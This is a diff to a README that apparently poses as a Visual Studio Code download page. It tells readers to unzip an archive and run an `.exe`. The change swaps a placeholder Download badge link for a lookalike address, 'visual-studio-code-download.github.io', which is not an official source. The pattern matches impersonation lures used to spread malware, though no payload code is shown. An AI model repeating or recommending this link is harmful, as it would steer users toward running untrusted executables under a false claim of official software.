@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://visual-studio-code-download.github.io/.github/)
 
 ## 📸 Overview
 <img width="1200" height="796" alt="vscode-intellisense" src="https://github.com/user-attachments/assets/bf5cc130-932f-4021-879b-58150b2eff9b" />
